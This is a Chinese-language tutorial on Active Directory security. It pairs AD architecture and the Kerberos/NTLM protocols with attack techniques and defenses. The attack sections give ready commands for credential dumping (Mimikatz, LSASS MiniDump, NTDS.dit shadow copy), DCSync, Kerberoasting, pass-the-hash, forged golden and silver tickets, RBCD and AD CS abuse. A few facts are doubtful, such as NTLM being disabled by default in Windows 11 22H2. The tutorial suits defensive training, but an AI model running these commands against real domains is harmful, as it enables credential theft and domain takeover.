# Active Directory 与域安全

> Active Directory（AD）是企业内网身份与访问管理的核心基础设施。掌握 AD 的架构、认证协议、攻击面与防御体系，是红蓝对抗的必修课。本文系统讲解 AD 域安全，从基础架构到攻击技术再到防御方案。

---

## 一、Active Directory 基础

### 1.1 AD 架构概述

**Active Directory** 是微软开发的目录服务，存储网络对象（用户、计算机、组等）信息，提供认证与授权服务。

**核心逻辑结构**：

```
林（Forest）── 根域 corp.local
  │
  ├── 域（Domain）corp.local
  │     ├── OU：Servers
  │     │     ├── 计算机对象：SRV-01
  │     │     └── 计算机对象：SRV-02
  │     ├── OU：Workstations
  │     │     └── 计算机对象：PC-001
  │     └── 用户容器：Users
  │           ├── 用户：admin
  │           └── 组：Domain Admins
  │
  └── 子域 child.corp.local（可选）
```

| 结构 | 说明 |
|------|------|
| **林（Forest）** | AD 最高容器，包含一个或多个共享架构和全局编录的域 |
| **域（Domain）** | 安全边界，独立管理用户/计算机/策略 |
| **OU（Organizational Unit）** | 域内组织单元，用于委派管理与组策略应用 |
| **站点（Site）** | 物理网络拓扑映射，优化复制和客户端登录 |

**关键概念**：
- **全局编录（GC）**：跨域搜索的索引，存储所有域对象的部分属性
- **FSMO 角色**：5 种灵活单主机操作角色（Schema Master、Domain Naming Master、RID Master、PDC Emulator、Infrastructure Master）
- **域功能级别**：决定可用功能与兼容性（2008R2 / 2012R2 / 2016 / 2019+）

### 1.2 域控制器与复制

**域控制器（DC）**：运行 AD DS 的服务器，存储域目录分区数据，处理认证请求。

**复制拓扑**：
- **站内复制（Intra-site）**：变更通知触发，低延迟（约15秒）
- **站间复制（Inter-site）**：按计划间隔（默认15-180分钟），压缩传输
- **多主机复制**：任何 DC 可写入变更，再同步到其他 DC（除 FSMO 单主机角色外）

```
# 查看域控复制状态
repadmin /showrepl
repadmin /replsummary
repadmin /syncall /A /d /e

# 查看域控信息
nltest /dsgetdc:corp.local
nltest /dclist:corp.local
```

### 1.3 LDAP 协议基础

**LDAP（轻量目录访问协议）**：TCP/389（明文）或 636（LDAPS/SSL），用于查询和修改 AD 数据。

**AD 目录信息树（DIT）结构**：

```
DC=corp,DC=local                      ← 域根
  ├── CN=Users                         ← 默认用户容器
  │     ├── CN=Administrator
  │     └── CN=Guest
  ├── OU=Servers                      ← 自定义OU
  │     └── CN=SRV-01
  ├── CN=Configuration                ← 配置分区
  └── CN=Schema                       ← 架构分区
```

**常用 LDAP 查询命令**：

```bash
# 使用 ldapsearch 查询域用户
ldapsearch -x -H ldap://dc01.corp.local \
  -D "admin@corp.local" -W \
  -b "DC=corp,DC=local" \
  "(objectCategory=user)" sAMAccountName memberOf

# 查询域管组
ldapsearch -x -H ldap://dc01.corp.local \
  -D "admin@corp.local" -W \
  -b "CN=Domain Admins,CN=Users,DC=corp,DC=local" member
```

### 1.4 Kerberos 认证流程详解

Kerberos 是 AD 的核心认证协议，基于票据（Ticket）的对称密钥体系。

**三方角色**：客户端（Client）、密钥分发中心（KDC，位于DC中）、服务（Service）

```
┌────────┐         ┌─────────────────┐         ┌─────────┐
│ Client │         │  KDC (域控内)    │         │ Service │
│        │         │  ┌───┐ ┌──────┐ │         │         │
│        │         │  │AS │ │ TGS  │ │         │         │
└───┬────┘         │  └───┘ └──────┘ │         └────┬────┘
    │              └────────┬────────┘              │
    │     ① AS-REQ          │                        │
    │ ────────────────────> │                        │
    │                       │                        │
    │     ② AS-REP          │                        │
    │ <──────────────────── │                        │
    │   (TGT + 会话密钥)     │                        │
    │                       │                        │
    │     ③ TGS-REQ         │                        │
    │ ────────────────────> │                        │
    │                       │                        │
    │     ④ TGS-REP         │                        │
    │ <──────────────────── │                        │
    │   (ST + 服务会话密钥)  │                        │
    │                       │                        │
    │     ⑤ AP-REQ          │                        │
    │ ────────────────────────────────────────────> │
    │     (ST + 认证符)      │                        │
    │                       │                        │
    │     ⑥ AP-REP (可选)    │                        │
    │ <──────────────────────────────────────────── │
```

**六步详解**：

| 步骤 | 名称 | 说明 |
|------|------|------|
| ① AS-REQ | 认证服务请求 | 客户端向 KDC 的 AS 发送预认证数据（用用户密码哈希加密的时间戳） |
| ② AS-REP | 认证服务响应 | AS 验证后返回 TGT（票据授予票据），用 krbtgt 账户哈希加密 |
| ③ TGS-REQ | 票据授予服务请求 | 客户端用 TGT 向 TGS 请求特定服务的票据（ST） |
| ④ TGS-REP | 票据授予服务响应 | TGS 返回 ST（服务票据），用服务账户哈希加密 |
| ⑤ AP-REQ | 应用请求 | 客户端向服务提交 ST 和认证符 |
| ⑥ AP-REP | 应用响应 | 服务验证 ST 后建立会话 |

**关键概念**：
- **TGT**：存储在客户端内存中，用 `krbtgt` 账户哈希加密，有效期默认10小时
- **PAC（Privilege Attribute Certificate）**：嵌入票据中的授权数据，包含用户SID和组成员关系
- **krbtgt 账户**：域内最关键的账户，其哈希用于加解密所有 TGT

### 1.5 NTLM 认证流程与缺陷

**NTLM（NT LAN Manager）** 是 Kerberos 的后备认证协议，在无法使用 Kerberos 时触发。

```
┌────────┐                           ┌─────────┐
│ Client │                           │   DC    │
└───┬────┘                           └────┬────┘
    │  ① Negotiate（协商）                 │
    │ ─────────────────────────────────> │
    │                                     │
    │  ② Challenge（16字节随机数）          │
    │ <───────────────────────────────── │
    │                                     │
    │  ③ Response（用密码哈希加密Challenge）│
    │ ─────────────────────────────────> │
    │                                     │
    │  ④ Authenticated                   │
    │ <───────────────────────────────── │
```

**NTLM 缺陷**：
- **无相互认证**：客户端无法验证服务器身份
- **离线破解友好**：响应中包含密码哈希衍生值，可离线爆破
- **已弃用**：微软从 Windows 11 22H2 起默认禁用 NTLM

```bash
# NTLM Hash 格式（存储在 NTDS.dit / SAM 中）
# 用户名:RID:LM哈希:NT哈希
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Mimikatz 抓取 NTLM 哈希（红队视角，仅用于授权测试）
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

---

## 二、AD 攻击面

### 2.1 信息收集

#### 域信息枚举（BloodHound / SharpHound）

**BloodHound**：图形化分析 AD 信任关系和攻击路径的工具。

```bash
# SharpHound 数据收集（PowerShell）
# 导入模块
Import-Module .\SharpHound.ps1

# 收集所有数据
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# 仅收集会话信息
Invoke-BloodHound -CollectionMethod Sessions -OutputDirectory C:\temp\

# 用 BloodHound 图形界面导入 JSON 数据分析
# neo4j 数据库存储图数据，查询最短攻击路径
```

#### 用户 / 组 / 计算机枚举

```bash
# PowerView（PowerShell 模块）
Import-Module .\PowerView.ps1

# 枚举域用户
Get-NetUser | select name, samaccountname, description

# 枚举域管组
Get-NetGroupMember -GroupName "Domain Admins"

# 枚举域内所有计算机
Get-NetComputer | select name, operatingsystem

# 查找域控
Get-NetDomainController

# 查找非约束委派账户
Get-NetUser -Unconstrained
```

#### GPO 枚举

```bash
# 枚举组策略对象
Get-NetGPO | select displayname, gpcfilesyspath

# 查找应用于特定OU的GPO
Get-NetGPO -OrganizationalUnit "OU=Servers,DC=corp,DC=local"

# 解析GPO中的安全配置
Get-GptTmpl -GPOName "{31B2F340-016D-11D2-945F-00C04FB984F9}"
```

#### SPN 扫描与 Kerberoasting 前置

```bash
# 查找所有配置了 SPN 的账户
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# 原生 setspn 命令
setspn -T corp.local -Q */*
```

### 2.2 凭证获取

#### Kerberoasting 攻击原理

**原理**：任何域用户都可以请求服务账户的 ST（服务票据），ST 用服务账户的密码哈希加密。如果服务账户密码较弱，可离线爆破。

```bash
# Rubeus（C#工具）请求所有SPN的TGS票据
Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket（Python）Kerberoasting
python GetUserSPNs.py corp.local/user:password -request

# hashcat 离线爆破 Kerberoast 哈希
hashcat -m 13100 hashes.txt wordlist.txt --force
# 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
```

**防御**：
- 服务账户使用25+字符强密码
- 使用组托管服务账户（gMSA），密码自动轮换
- 票据加密使用 AES-256 而非 RC4

#### AS-REP Roasting

**原理**：对于配置了"不需要 Kerberos 预认证"的账户，攻击者可直接请求 AS-REP，其中包含用用户密码哈希加密的数据。

```bash
# Rubeus AS-REP Roasting
Rubeus.exe asreproast /outfile:hashes.txt

# Impacket
python GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat

# hashcat 爆破
hashcat -m 18200 hashes.txt wordlist.txt
# 18200 = Kerberos 5 AS-REP etype 23
```

#### DCSync 攻击（DRSUAPI）

**原理**：拥有"复制目录变更"权限的账户（如 Domain Admins 或被过度委派的账户）可通过 `DRSGetNCChanges` 接口模拟域控复制，直接获取任意用户的密码哈希。

```bash
# Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Impacket secretsdump
python secretsdump.py -just-dc-user Administrator corp.local/user:password@dc01.corp.local
```

#### NTDS.dit 提取

**NTDS.dit** 是域控上的 AD 数据库文件，存储所有用户哈希。

```bash
# 使用 ntdsutil 创建 IFM 介质（需要管理员权限）
ntdsutil
  > activate instance ntds
  > ifm
  > create full C:\temp\ntds_dump
  > quit

# 或使用 vssadmin 卷影复制提取
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# 使用 secretsdump 解析
python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### LSASS 凭据

LSASS 进程内存中缓存了多种凭据（NTLM 哈希、Kerberos 票据、明文密码等）。

```bash
# Mimikatz 从 LSASS 提取
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets    # 导出票据

# comsvcs.dll 迷你转储（无需 mimikatz）
rundll32 comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full
```

### 2.3 横向移动

#### Pass-the-Hash (PtH)

**原理**：使用 NTLM 哈希代替密码进行认证。

```bash
# Mimikatz Pass-the-Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe

# Impacket PsExec
python psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/Administrator@target
```

#### Pass-the-Ticket (PtT)

**原理**：直接使用已获取的 Kerberos 票据进行认证。

```bash
# Mimikatz 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt C:\temp\ticket.kirbi

# Rubeus 票据注入
Rubeus.exe ptt /ticket:base64_ticket_data
```

#### Overpass-the-Hash

**原理**：用 NTLM 哈希获取完整的 TGT，然后正常使用 Kerberos 认证，规避 NTLM 日志。

```bash
mimikatz # sekurlsa::pth /user:user1 /domain:corp.local /ntlm:aad3b435... /run:powershell.exe
# 在新进程中执行 klist 获取 TGT，然后使用 Kerberos 认证
```

#### 黄金票据（Golden Ticket）

**原理**：攻击者获取 krbtgt 账户哈希后，可伪造任意用户的 TGT，包括不存在的用户，赋予任意权限。

```bash
# Mimikatz 生成黄金票据
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<ntlm_hash> /id:500 /ptt

# 特征：即使 krbtgt 密码已轮换一次（需要轮换两次才能完全失效）
```

**防御**：
- 定期轮换 krbtgt 密码（需两次）
- 监控异常 TGT（有效期异常、PAC 不匹配）
- 限制 DC 权限

#### 白银票据（Silver Ticket）

**原理**：用服务账户哈希伪造 ST（服务票据），不经过 KDC，不需要 TGT。

```bash
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:cifs /rc4:<service_hash> /ptt
```

#### 钻石票据（Diamond Ticket）

**原理**：获取合法 TGT 后，修改其中的 PAC（提升权限），再用 krbtgt 哈希重新签名。比黄金票据更隐蔽，因为 TGT 来源于合法请求。

### 2.4 域提权

#### 滥用 ACL

AD 中对象的 ACL 权限可被滥用实现提权：

| 权限 | 滥用方式 |
|------|---------|
| `GenericAll` | 修改目标用户密码、添加到组 |
| `ForceChangePassword` | 重置目标用户密码 |
| `AddMember` | 将自己添加到高权组 |
| `GenericWrite` | 修改目标属性（如 SPN，用于 Kerberoasting） |
| `WriteDacl` | 修改 ACL 赋予自己更多权限 |

```bash
# PowerView：利用 GenericAll 重置密码
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)

# 利用 AddMember 将自己加入高权组
Add-DomainGroupMember -Identity "Help Desk" -Members "attacker"
```

#### Kerberos 委派攻击

| 委派类型 | 说明 | 攻击方式 |
|----------|------|---------|
| **非约束委派** | 服务可代表任何用户获取任何服务的票据 | 诱使域管访问服务，获取其 TGT |
| **约束委派** | 服务仅可代表用户获取指定服务的 ST | S4U2Self/S4U2Proxy 滥用 |
| **基于资源的约束委派（RBCD）** | 通过 msDS-AllowedToActOnBehalfOfOtherIdentity 配置 | 添加计算机账户后模拟任意用户 |

```bash
# 查找非约束委派计算机
Get-NetComputer -Unconstrained

# RBCD 攻击（需要 MachineAccountQuota 权限）
# 1. 创建计算机账户
Invoke-CreateComputer -ComputerName "EVIL$" -Password "Pass123!"

# 2. 在目标计算机上设置 RBCD
Set-RBCD -Identity TARGET$ -DelegateFrom "EVIL$"

# 3. 使用 Rubeus 通过 S4U 获取票据
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /dc:dc01.corp.local /ptt /user:EVIL$ /rc4:<hash>
```

#### 域信任关系利用

**信任方向**：
- 单向信任：A 信任 B，则 B 的用户可访问 A 的资源
- 双向信任：互相可访问

```bash
# 枚举域信任
Get-NetDomainTrust

# 跨域枚举
Get-NetForestDomain    # 获取林内所有域
Get-NetForestTrust     # 获取林信任
```

#### AD CS 攻击（ESC1-ESC8）

**AD CS（Active Directory 证书服务）** 可被滥用签发证书绕过认证。

| 编号 | 名称 | 说明 |
|------|------|------|
| ESC1 | 低权限模板可指定 SAN | 申请证书时冒充任意用户 |
| ESC2 | 任意目的模板滥用 | 利用 Any Purpose EKU 签发证书 |
| ESC3 | 证书申请代理模板 | 用代理证书为他人申请 |
| ESC4 | 模板 ACL 过宽 | 修改模板配置 |
| ESC5 | PKI 对象 ACL 过宽 | 修改 CA 配置 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | 全局允许 SAN 指定 |
| ESC7 | CA 管理员权限滥用 | 通过 CA 管理角色利用 |
| ESC8 | NTLM Relay 到 Web Enrollment | 中继认证到证书注册接口 |

```bash
# Certify（C#工具）枚举易受攻击的证书模板
Certify.exe find /vulnerable

# 申请 ESC1 证书（冒充 Administrator）
Certify.exe request /ca:DC01\corp-CA /template:VulnTemplate /altname:Administrator
```

---

## 三、AD 防御体系

### 3.1 Tier 分层管理模型

**Tier Model** 是微软推荐的分层管理架构，通过物理和逻辑隔离限制横向移动。

```
┌──────────────────────────────────────────┐
│ Tier 0：域控层（最高权限）                  │
│   域控制器、AD DS、AD CS、虚拟化平台         │
│   规则：Tier 0 管理员不得登录 Tier 1/2     │
├──────────────────────────────────────────┤
│ Tier 1：服务器层                           │
│   企业服务器、数据库、应用服务器             │
│   规则：Tier 1 管理员不得登录 Tier 0/2     │
├──────────────────────────────────────────┤
│ Tier 2：工作站层                           │
│   用户工作站、终端设备                      │
│   规则：用户不得登录 Tier 0/1              │
└──────────────────────────────────────────┘
```

**核心原则**：
- 管理员账户分层使用（不同 Tier 用不同账户）
- 限制跨层登录（通过 GPO 的"拒绝本地登录"策略）
- 使用 PAW（Privileged Access Workstation）管理 Tier 0

### 3.2 LAPS 本地管理员密码方案

**LAPS（Local Administrator Password Solution）**：自动管理域内机器本地管理员密码，定期轮换并存储在 AD 计算机对象的机密属性中。

```powershell
# LAPS（旧版，GPO + AD 扩展）
# 计算机属性：ms-Mcs-AdmPwd（密码）、ms-Mcs-AdmPwdExpirationTime（过期时间）

# Windows LAPS（新版，集成于 Windows 11 22H2+）
# PowerShell 管理
Get-LapsPassword -Identity SRV-01
Reset-LapsPassword -Identity SRV-01
Set-LapsADPasswordExpirationTime -Identity SRV-01 -WhenEffective (Get-Date).AddDays(7)

# 配置策略
# GPO: Computer Configuration > Admin Templates > Windows LAPS
```

### 3.3 Microsoft Defender for Identity

**MDI（原 Azure ATP）**：云托管的 AD 安全监控服务，检测域内可疑行为。

**检测能力**：
- 侦察检测（LDAP 枚举、SPN 扫描）
- 凭证窃取检测（Kerberoasting、AS-REP Roasting）
- 横向移动检测（Pass-the-Hash、Pass-the-Ticket）
- 域支配检测（DCSync、黄金票据、可疑 PAC）
- 异常行为基线（登录模式异常）

**部署**：
- 在域控上安装传感器（读取网络流量和 Windows 事件）
- 传感器将数据发送到云端分析

### 3.4 可写 / 只读域控制器部署

**RODC（Read-Only Domain Controller）**：
- 不存储可写副本，适合物理安全无法保证的分支站点
- 不缓存所有用户密码，仅缓存指定用户
- 单向复制，不将变更回传到主 DC

```powershell
# 部署 RODC
# 前提：需要运行 adprep /rodcprep
Install-ADDSDomainController -DomainName corp.local -SiteName "BranchSite" -ReadOnlyReplica
```

### 3.5 Kerberos 安全加固

| 加固项 | 说明 |
|--------|------|
| **AES 加密** | 禁用 RC4，强制 AES-256-HMAC 加密票据 |
| **Protected Users 组** | 成员禁用 NTLM、TGT 有效期缩短至4小时、不支持委派 |
| **KRBTGT 密码轮换** | 定期轮换（需两次连续轮换以使黄金票据完全失效） |
| **禁用预认证豁免** | 检查并禁用"Do not require Kerberos preauthentication" |
| **启用 PAC 验证** | 确保 KDC 和服务验证 PAC 签名 |

### 3.6 组策略安全配置

```powershell
# 关键 GPO 安全配置

# 1. 账户锁定策略
# Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies
#    Account lockout threshold: 5
#    Account lockout duration: 30 minutes
#    Reset account lockout counter: 30 minutes

# 2. Kerberos 策略
#    Max ticket age: 10 hours
#    Max service ticket age: 600 minutes
#    Enforce user logon restrictions: Enabled

# 3. 安全审计策略
#    Audit logon events: Success, Failure
#    Audit account management: Success, Failure
#    Audit directory service access: Success, Failure
#    Audit Kerberos authentication service: Success, Failure
```

### 3.7 AD 回收站与快照保护

```powershell
# 启用 AD 回收站（需要林功能级别 2008 R2+）
Enable-ADOptionalFeature -Identity "Recycle Bin Feature" -Scope ForestOrConfigurationSet -Target "corp.local"

# 恢复已删除对象
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects | Restore-ADObject

# AD 快照（定期备份）
ntdsutil snapshot "activate instance ntds" create quit quit
```

---

## 四、AD 安全审计

### 4.1 AD 审计日志关键事件

| 事件ID | 日志名称 | 说明 |
|--------|---------|------|
| 4720 | Security | 创建用户账户 |
| 4722 | Security | 用户账户启用 |
| 4726 | Security | 用户账户删除 |
| 4728 | Security | 成员加入全局安全组 |
| 4738 | Security | 用户账户修改 |
| 4740 | Security | 账户锁定 |
| 4768 | Security | Kerberos TGT 请求（AS-REQ） |
| 4769 | Security | Kerberos ST 请求（TGS-REQ） |
| 4771 | Security | Kerberos 预认证失败 |
| 4776 | Security | NTLM 认证 |
| 4662 | Security | 目录服务对象操作（含 DCSync） |
| 5136 | Security | 目录服务对象修改 |
| 4944 | Security | 审核策略变更 |

```powershell
# 查询 DCSync 相关事件
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4662} |
  Where-Object {$_.Message -match "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"} |
  Select-Object TimeCreated, SubjectUserName, TargetUserName
# 1131f6aa = DS-Replication-Get-Changes
# 1131f6ad = DS-Replication-Get-Changes-All（DCSync 所需权限）
```

### 4.2 BloodHound 蓝队使用

蓝队使用 BloodHound 识别攻击路径并消除高权路径：

```
# Cypher 查询：查找从普通用户到 Domain Admins 的最短路径
MATCH (n:User) WHERE NOT n.admincount=true
MATCH p=shortestPath((n)-[*1..15]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

# 查找所有可 DCSync 的路径
MATCH (n)-[:GetChangesAll]->(g:Domain) RETURN n.name, g.name

# 查找非约束委派
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

### 4.3 PingCastle / ADSI 安全评估

```bash
# PingCastle（AD 安全评估工具）
# 生成 HTML 报告，评分 A-F
PingCastle.exe --server dc01.corp.local --user admin --password *** --output report.html

# 检查项：域功能级别、管理员数量、委派配置、密码策略、信任关系等
```

### 4.4 Python AD 安全检查脚本示例

```python
"""
AD 安全检查脚本 - 通过 LDAP 查询检测常见配置风险
依赖: pip install ldap3
"""

from ldap3 import Server, Connection, ALL
from datetime import datetime
import json

class ADSecurityChecker:
    def __init__(self, server, bind_dn, password):
        self.server = Server(server, get_info=ALL)
        self.conn = Connection(self.server, user=bind_dn, password=password, auto_bind=True)
        self.base_dn = None
        self._get_base_dn()

    def _get_base_dn(self):
        """获取域 DN"""
        if 'defaultNamingContext' in self.server.info.other:
            self.base_dn = self.server.info.other['defaultNamingContext'][0]
        else:
            self.base_dn = 'DC=corp,DC=local'

    def check_asrep_roastable(self):
        """检查不需要预认证的账户（AS-REP Roasting 风险）"""
        search_filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        self.conn.search(self.base_dn, search_filter, attributes=['sAMAccountName', 'userAccountControl'])
        results = []
        for entry in self.conn.entries:
            results.append({'account': str(entry.sAMAccountName), 'risk': 'AS-REP Roasting'})
        return results

    def check_unconstrained_delegation(self):
        """检查非约束委派账户"""
        search_filter = '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
        self.conn.search(self.base_dn, search_filter, attributes=['sAMAccountName', 'userAccountControl'])
        results = []
        for entry in self.conn.entries:
            results.append({'account': str(entry.sAMAccountName), 'risk': 'Unconstrained Delegation'})
        return results

    def check_admincount(self):
        """检查高权属性用户"""
        search_filter = '(adminCount=1)'
        self.conn.search(self.base_dn, search_filter, attributes=['sAMAccountName', 'memberOf'])
        results = []
        for entry in self.conn.entries:
            results.append({'account': str(entry.sAMAccountName), 'risk': 'Admin-tier account'})
        return results

    def check_dormant_accounts(self, days=90):
        """检查长期未登录的休眠账户"""
        search_filter = '(&(objectClass=user)(!lastLogon=0))'
        self.conn.search(self.base_dn, search_filter, attributes=['sAMAccountName', 'lastLogon'])
        threshold = (datetime.now().timestamp() - days * 86400) * 10**7  # AD 时间戳格式
        results = []
        for entry in self.conn.entries:
            try:
                last_logon = int(str(entry.lastLogon))
                if last_logon < threshold and last_logon > 0:
                    results.append({'account': str(entry.sAMAccountName), 'risk': f'Dormant>{days}d'})
            except (ValueError, TypeError):
                continue
        return results

    def run_all_checks(self):
        """运行所有检查"""
        all_risks = []
        print("[*] Checking AS-REP Roastable accounts...")
        all_risks.extend(self.check_asrep_roastable())
        print("[*] Checking unconstrained delegation...")
        all_risks.extend(self.check_unconstrained_delegation())
        print("[*] Checking admin-tier accounts...")
        all_risks.extend(self.check_admincount())
        print("[*] Checking dormant accounts...")
        all_risks.extend(self.check_dormant_accounts())
        return all_risks


if __name__ == '__main__':
    checker = ADSecurityChecker(
        server='ldap://dc01.corp.local',
        bind_dn='admin@corp.local',
        password='YourPassword'
    )
    risks = checker.run_all_checks()
    print(f"\n[+] Found {len(risks)} risk(s):")
    for r in risks:
        print(f"    - {r['account']}: {r['risk']}")
    # 输出 JSON 便于集成到 SIEM
    print(json.dumps(risks, indent=2, ensure_ascii=False))
```

---

## 五、零信任与 AD 演进

### 5.1 Entra ID（Azure AD）混合架构

传统 AD 与 Entra ID 的混合架构是企业向云迁移的过渡方案：

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
│ 本地 AD DS   │────→│ Entra Connect Sync│───→│ Entra ID     │
│ (域控)       │     │ (目录同步)         │    │ (Azure AD)   │
└──────────────┘     └──────────────────┘     └──────┬───────┘
                                                      │
                                          ┌───────────┼───────────┐
                                          │           │           │
                                     ┌─────▼────┐ ┌───▼───┐ ┌─────▼────┐
                                     │ M365 应用 │ │ Azure │ │ SaaS SSO │
                                     └──────────┘ └───────┘ └──────────┘
```

**混合认证模式**：
- **PHS（密码哈希同步）**：将本地密码哈希同步到云端，支持云认证
- **PTA（直通认证）**：通过本地代理验证密码，不存储哈希到云
- **Federation（联合认证）**：使用 ADFS/Entra 作为 IdP，本地保留认证

### 5.2 从域信任到零信任

| 维度 | 传统 AD 域信任 | 零信任模型 |
|------|---------------|-----------|
| 信任基础 | 网络位置 + 域认证 | 身份 + 设备 + 上下文 |
| 认证频率 | 一次登录长期有效（TGT 10h） | 每次访问持续评估 |
| 权限模型 | 静态组成员 | 动态策略 + JIT |
| 横向移动风险 | 高（Kerberos 票据可传递） | 低（微隔离 + 条件访问） |
| 管理边界 | 域/林边界 | 身份为中心，无边界 |

**演进路线**：
1. **加固期**：Tier 分层、LAPS、MDI、ACL 清理
2. **过渡期**：混合身份（Entra Connect）、条件访问策略
3. **目标态**：Entra ID 为身份平面，设备合规检查，JIT/PAM，无域信任

```
# Entra ID 条件访问策略示例（PowerShell）
$policy = @{
    DisplayName = "Require MFA for Admins"
    State = "Enabled"
    Conditions = @{
        Users = @{ IncludeGroups = @("Domain-Admins") }
        Applications = @{ IncludeApplications = @("All") }
    }
    GrantControls = @{
        Operator = "AND"
        BuiltInControls = @("Mfa", "CompliantDevice")
    }
}
New-MgIdentityConditionalAccessPolicy -BodyParameter ($policy | ConvertTo-Json -Depth 10)
```

---

## 六、总结

Active Directory 域安全是内网安全的基石。本文覆盖的关键要点：

- **认证协议**：Kerberos 是核心，NTLM 为后备（逐步淘汰）
- **攻击链**：信息收集 → 凭证获取 → 横向移动 → 域提权
- **高危攻击**：黄金票据、DCSync、Kerberoasting、RBCD 委派
- **防御核心**：Tier 分层、LAPS、MDI、ACL 最小化、krbtgt 轮换
- **审计工具**：BloodHound、PingCastle、Windows 事件日志
- **未来方向**：零信任 + Entra ID 混合架构

安全从业者应在授权环境下使用上述技术进行攻防演练，持续验证防御有效性。
